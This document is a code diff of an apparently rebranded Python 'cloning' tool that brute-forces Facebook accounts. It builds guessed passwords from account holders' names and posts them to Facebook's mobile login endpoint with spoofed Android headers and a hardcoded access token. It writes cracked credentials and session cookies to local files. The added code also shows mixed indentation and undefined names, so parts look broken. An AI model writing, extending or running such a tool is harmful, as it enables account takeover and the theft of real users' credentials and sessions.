@@ -482,7 +482,7 @@ class crack_main():
         def m1(self,iid,name,passlist):
                 try:
                         global ok,loop,android_models
-                        sys.stdout.write('\r[QSR] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
+                        sys.stdout.write('\r[UMAR] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                         fn = name.split(' ')[0]
                         try:
                                 ln = name.split(' ')[1]
@@ -516,12 +516,10 @@ class crack_main():
                                 encoded = base64.b64encode(buf.getvalue()).decode("utf-8")
                                 enc_pas=f"#PWD_REACTNATIVE:2:{current_time}:{encoded}"
                                 #corect key : #PWD_REACTNATIVE:2:1669575164:ARlixWtwqn5ecY9XZpoAAVzD71QplMe35ZcKPj6YFm2g7VuXwhxuLL57tYTRivV9LIJ0+qHSURHN989EqbyIJumFGFLpEOqfdHHFkZFgqH3KGks0eQ9b4x8G2ut57oElaQ/B4kcWUP4lcJFjiGySQ7Gd9Q9VAud+LPcAdMn7i11BoHcZr6a8jODjk53LoT9F6AdiACRbpxcQD4f/Md9YI/KMlEnsSeNRvul9FdyTPko83QEEpy+/coDfnfT7kVEm39uyHeYT7qS/G5TxDi+pCIR3GG87rcnN8TKGtxZ/sxy0mjF3OUaUBq/PAdmmL3nr/1bCCQBYWjsY682mO2Du8RLSVaQQY0Xl59qlBgh6QuFkTunm5+8AExOIZ5qFZrRP7YlthRWtL6xbL0FHN/kYFTJUL79v
-                                #wrong key  : #PWD_REACTNATIVE:2:1669575552:ARl0BpPjNShZzDs2Z6sAAQX8OVQeDsONp1KNXblCsOQMQc6+d/0weZtIYeegvNY/34O0NzSB4uu0xNwd2RTFLfM+6wlqtn+21v3i+B717NFopebkdG1C1oA+WCVNuMxYWA/FCQt4K3hc6iG4tyOpO+ObqVAJBoDYLS2WnX7aEucv/W11FMC8yGfOfHNsTlpjT/74SUVCFa5Z4lxBhdrQBJt1+GL/ikwbtZq4Vx48hy1w4WCu8l/D1YzUu2sCFej7K5o8X1EN/7KqqtNbAugoDsg1jourI+TCFO2O0YECELFohjgu+ZzYElhq9RLVHIyJY/iP5/jcKnYa867Pvz4FisOzHXkh1w8BegtAW5Yw1hdlk/rtrHhxp5+I9rXLNPvcpL2IwPY=
-                                mobile_names = random.choice(["Huawei","Motorola","Oppo","Realme","Samsung","Sony","Xiaomi","LG","Lenovo","Infinix"])
+                                #wrong key  : #PWD_REACTNATIVE:2:1669575552:ARl0BpPjNShZzDs2Z6sAAQX8OVQeDsONp1KNXblCsOQMQc6+d/0weZtIYeegvNY/34O0NzSB4uu0xNwd2RTFLfM+6wlqtn+21v3i+B717NFopebkdG1C1oA+WCVNuMxYWA/FCQt4K3hc6iG4tyOpO+ObqVAJBoDYLS2WnX7aEucv/W11FMC8yGfOfHNsTlpjT/74SUVCFa5Z4lxBhdrQBJt1+GL/ikwbtZq4Vx48hy1w4WCu8l/D1YzUu2sCFej7K5o8X1EN/7KqqtNbAugoDsg1jourI+TCFO2O0YECELFohjgu+ZzYElhq9RLVHIyJY/iP5/jcKnYa867Pvz4FisOzHXkh1w8BegtAW5Yw1hdlk/rtrHhxp5+I9rXLNPvcpL2IwPY=                                
                                 five_ip = str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))
                                 one_string_two_ip = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(4))+str(".")+str(random.randint(111111,222222))+str(".0")+str(random.randint(10,40))
-                                url = 'https://b-api.facebook.com/auth/login'
-                                #brand_name=Techno Ya Single Name
+                                url = 'https://b-api.facebook.com/auth/login'                            
                                 infos = open('device_info.txt','r').read()
                                 version_,model_,brand_name_,width_,height_=infos.split('$')
                                 head = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android "+version_+"; "+model_+" Build/QP1A.190711.020) [FBAN/MobileAdsManagerAndroid;FBAV/"+str(random.randint(200,350))+"."+str(random.randint(0,1))+".0."+str(random.randint(20,70))+"."+str(random.randint(110,280))+";FBBV/"+str(random.randint(412627882,419003907))+";FBRV/0;FBLC/en_US;FBMF/"+brand_name_+" MOBILE LIMITED;FBBD/"+brand_name_+";FBDV/TECNO LD7;FBSV/"+version_+";FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,width="+width_+",height="+height_+"};FB_FW/1;]","Content-Type": "application/json;charset=utf-8","Host":"graph.facebook.com","Connection": "Keep-Alive","Accept-Encoding": "gzip"}
@@ -537,7 +535,7 @@ class crack_main():
                                         ok.append(iid)
                                         break
                                 elif 'Please Confirm Email' in po:
-                                        print(' \033[1;32m[QSR-OK] '+roid+' | '+pas+'\033[0;97m')
+                                        print(' \033[1;32m[UMAR-OK] '+roid+' | '+pas+'\033[0;97m')
                                         open('/sdcard/umar_ok.txt','a').write(roid+'|'+pas+'\n')
                                         ok.append(iid)
                                         break
@@ -553,23 +551,9 @@ class crack_main():
                 if not os.path.exists('device_info.txt'):
                         os.system('clear')
                         print(logo)
-                        print(" what is your andriod version ex 8,9,10")
+                        print(" what is your andriod version ex 8,9,10,11,12,13")
                         version_=input(' type andriod version : ')
-                        print(44*'-')
-                        print(" your mobile module name ex Techno LD7 etc")
-                        model_=input(" module name : ")
-                        print(44*"-")
-                        print(" your mobile company name ex Techno,Redmi")
-                        brand_name_=input(" device company name : ")
-                        print(44*'-')
-                        print(" your mobile width ex 720,740,730,780 etc")
-                        width_=input(" device width : ")
-                        print(44*'-')
-                        print(" your mobile height ex 1660,1780,1730 etc")
-                        height_=input(" device company name : ")
-                        info_file = open("device_info.txt","a").write(version_+'$'+model_+'$'+brand_name_+'$'+width_+'$'+height_)
-                os.system('clear')
-                print(logo);xchker()
+                        print(44*'-')                                                             
                 pl = int(input(' How Much Password Do You Want To Add ? '))
                 print(' Example first123,last123,khan123,firstlast')
                 print(50*"-")
@@ -581,21 +565,86 @@ class crack_main():
                 print(' Cloning Is Started Wait For Results')
                 print(' After Every 5 Min Turn Airplane On/Off')
                 print(50*'-')
-                with ThreadPool(max_workers=30) as formSubmit:
-                        for user in self.id:
-                                if '2' in clone_type:
-                                        iid,name = user.split('|')
-                                else:
-                                        od,name = user.split('|')
-                                        iid = od+'@facebook.com'
-                                formSubmit.submit(self.m1,iid,name,passlist)
-                print(50*'-')
-                print(' SucessFully Process Is Completed ')
-                print(' Total Ok Ids : '+str(len(ok)))
-                print(' Ok Ids Save In : /sdcard/UMAR_ok.txt')
-                print(50*'-')
-                input('\n Press enter to back ')
-                main()
+                with tpd(max_workers=30) as saqi:
+			for user in id:
+				uid,nm = user.split('|')
+				if 'i' in method:
+					saqi.submit(self.method1,uid,nm,pwx)
+				elif 'ii' in method:
+					saqi.submit(self.method2,uid,nm,pwx)
+				elif 'iii' in method:
+					saqi.submit(self.method3,uid,nm,pwx)
+		self.saved_results(ok,cp)
+ 
+	def method1(self,uid,nm,pwx):
+		try:
+			global ok , cp , loop
+			sys.stdout.write('\r [UMAR] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
+			fn = nm.split(' ')[0]
+			try:
+				ln = nm.split(' ')[1]
+			except:
+				ln = fn
+			for ps in pwx:
+				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
+				data = {"adid": str(uuid.uuid4()),
+"format": "json",
+"device_id": str(uuid.uuid4()),
+"cpl": "true",
+"family_device_id": str(uuid.uuid4()),
+"credentials_type": "device_based_login_password",
+"error_detail_type": "button_with_disabled",
+"source": "device_based_login",
+"email": uid,
+"password": pw,
+"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
+"generate_session_cookies": "1",
+"meta_inf_fbmeta": "",
+"advertiser_id": str(uuid.uuid4()),
+"currently_logged_in_userid": "0",
+"locale": "en_GB",
+"client_country_code": "GB",
+"method": "auth.login",
+"fb_api_req_friendly_name": "authenticate",
+"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+"api_key": "882a8490361da98702bf97a021ddc14d"}
+				headers = {'User-Agent': iAmAndroidUa(),
+'Content-Type': 'application/x-www-form-urlencoded',
+'Host': 'graph.facebook.com',
+'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+'X-FB-Connection-Type': 'MOBILE.LTE',
+'X-Tigon-Is-Retry': 'False',
+'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+'x-fb-device-group': '5120',
+'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+'X-FB-Request-Analytics-Tags': 'graphservice',
+'X-FB-HTTP-Engine': 'Liger',
+'X-FB-Client-IP': 'True',
+'X-FB-Server-Cluster': 'True',
+'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
+				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
+				if "session_key" in q:
+					coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+					cookie = f"sb={sb};{coki}"
+					p('\r\033[1;92m[UMAR-OK] %s | %s \033[1;97m '%(uid,pw))
+					ok.append(uid)
+					open('/sdcard/UMAR_M1_OK.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
+					break
+				elif 'www.facebook.com' in q['error']['message']:
+					p('\r\033[1;91m[UMAR-CP] %s | %s \033[1;97m '%(uid,pw))
+					cp.append(uid)
+					open('/sdcard/UMAR_M1_CP.txt','a').write(uid+'|'+pw+'\n')
+					break
+				else:
+					continue
+			loop+=1
+		except requests.exceptions.ConnectionError:
+				self.method1(uid,nm,pwx)
+		exit()
+if __name__=="__main__":
+	Main().menu()
 
 
 def create_file():
@@ -844,7 +893,7 @@ except PermissionError:
 pat = os.getcwd()
 datar = []
 datar.append(pat)
-if '/data/data/com.termux/files/home/Qsr' in datar:
+if '/data/data/com.termux/files/home/umar' in datar:
         pass
 else:
         for i in range(5000):
